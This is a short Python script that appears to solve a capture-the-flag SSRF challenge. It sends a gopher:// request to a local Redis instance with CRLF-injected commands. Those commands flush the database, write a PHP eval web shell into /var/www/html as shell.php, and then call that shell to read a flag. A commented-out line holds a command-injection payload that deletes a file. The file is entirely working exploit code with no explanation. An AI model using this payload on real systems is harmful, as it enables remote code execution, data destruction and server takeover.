import requests
import os
from bs4 import BeautifulSoup

url = 'https://ssrf.unitedctf.ca/'
open_port = 6379

# payload = '/anuss.php?cmd=rm admin.'
payload2 = " flushall%0d%0aset 1 %27<?php eval($_GET[%22cmd%22]);?>%27%0d%0aconfig set dir /var/www/html%0d%0aconfig set dbfilename shell.php%0d%0asave"

req = 'gopher://localhost:{}/{}'.format(open_port, payload2)
# req = 'https://localhost/{}'.format(payload)
headers = {'User-agent': 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'}

# resp = requests.post(url, data = {'url':req}, headers=headers)
# soup = BeautifulSoup(resp.text, 'html.parser')
# temp_url = url + soup.find("iframe")["src"]

# r2 = requests.get(temp_url)
r3 = requests.get(url+'shell.php?cmd=/flag')
#print(r2.text)
print(r3.text)

# cmd = 'curl {}'.format(temp_url)
# os.system(cmd)
